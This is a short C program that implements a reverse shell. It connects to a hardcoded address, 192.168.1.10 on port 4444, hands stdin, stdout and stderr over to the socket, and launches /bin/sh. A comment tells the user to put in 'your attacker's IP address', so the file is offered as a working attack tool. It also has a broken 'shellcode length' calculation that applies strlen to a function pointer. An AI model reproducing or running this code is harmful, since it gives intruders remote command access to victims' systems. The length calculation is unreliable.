#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

void reverse_shell(char *ip, int port) {
    int sockfd;
    struct sockaddr_in server_addr;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        return;
    }

    // Connect to server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        return;
    }

    // Redirect stdin, stdout, and stderr to the socket
    dup2(sockfd, 0);  // stdin
    dup2(sockfd, 1);  // stdout
    dup2(sockfd, 2);  // stderr

    // Execute shell
    execve("/bin/sh", NULL, NULL);
}

int main() {
    char ip[] = "192.168.1.10";  // Replace with your attacker's IP address
    int port = 4444;             // Replace with your chosen port number

    printf("Reverse Shellcode Length: %lu\n", strlen((char *)reverse_shell));

    // Execute the reverse shellcode
    reverse_shell(ip, port);

    return 0;
}
